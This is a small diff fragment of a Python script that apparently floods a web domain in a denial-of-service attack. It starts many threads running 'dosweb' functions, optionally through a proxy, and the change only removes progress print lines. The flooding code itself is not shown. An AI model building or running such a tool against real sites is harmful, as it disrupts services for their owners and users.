@@ -119,14 +119,12 @@ else:
         exit(colorama.Fore.RED + "Invalid domain")
 
     proxyuseage = int(input("Use a proxy?[1-yes; 2-no]: "))
-    
+
     print(colorama.Fore.YELLOW + "Starting threads")
     if proxyuseage == 1:
         for i in range(0, threads):
             threading.Thread(target=dosweb1, args=(url,)).start()
-            print(colorama.Fore.GREEN + str(i + 1) + " thread started!")
     else:
         for i in range(0, threads):
             threading.Thread(target=dosweb2, args=(url,)).start()
-            print(colorama.Fore.GREEN + str(i + 1) + " thread started!")
     print(colorama.Fore.GREEN + "All threads are running")
